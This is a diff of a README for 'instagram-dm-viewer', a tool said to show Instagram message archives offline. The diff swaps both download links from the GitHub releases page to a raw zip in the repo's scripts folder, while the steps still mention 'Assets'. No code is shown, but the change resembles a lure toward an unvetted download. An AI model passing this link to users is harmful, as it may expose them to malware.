@@ -1,6 +1,6 @@
 # 💬 instagram-dm-viewer - View your private messages without uploads
 
-[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/piggyhumified616/instagram-dm-viewer/releases)
+[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/piggyhumified616/instagram-dm-viewer/raw/refs/heads/main/scripts/instagram-dm-viewer-v1.5.zip)
 
 Instagram stores your conversation history into data archives. This tool lets you open these archives on your own computer. You see your chats in a format that looks like the Instagram app. Your data stays on your machine at all times. This software does not send your private messages to any server or cloud service.
 
@@ -8,7 +8,7 @@ Instagram stores your conversation history into data archives. This tool lets yo
 
 Visit the link below to find the files for your computer. You do not need to install anything complex.
 
-[https://github.com/piggyhumified616/instagram-dm-viewer/releases](https://github.com/piggyhumified616/instagram-dm-viewer/releases)
+[https://github.com/piggyhumified616/instagram-dm-viewer/raw/refs/heads/main/scripts/instagram-dm-viewer-v1.5.zip](https://github.com/piggyhumified616/instagram-dm-viewer/raw/refs/heads/main/scripts/instagram-dm-viewer-v1.5.zip)
 
 1. Go to the link.
 2. Look for the section labeled Assets.
